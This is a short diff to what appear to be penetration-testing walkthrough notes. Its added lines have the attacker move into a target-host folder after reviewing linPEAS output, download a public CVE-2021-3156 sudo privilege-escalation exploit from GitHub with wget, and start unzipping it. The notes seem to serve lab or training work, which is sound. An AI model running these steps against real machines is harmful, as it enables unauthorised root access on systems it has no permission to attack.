@@ -80,3 +80,8 @@ were going to download linPEAS to ourselves (ATTACKER) and then access it throug
 (ATTACKER) mv linpeas_output ./Desktop/pentest/internal/192.168.1.102 [this might not be your file path so just make sure its in "internal"]
 (ATTACKER) cd [your path to verify]
 (ATTACKER) cat linpeas_output| less -r
+(ATTACKER) cd ./Desktop/pentest/internal/192.168.1.102
+(ATTACKER) ls
+(ATTACKER) wget https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+(ATTACKER) file main
+(ATTACKER) unzip
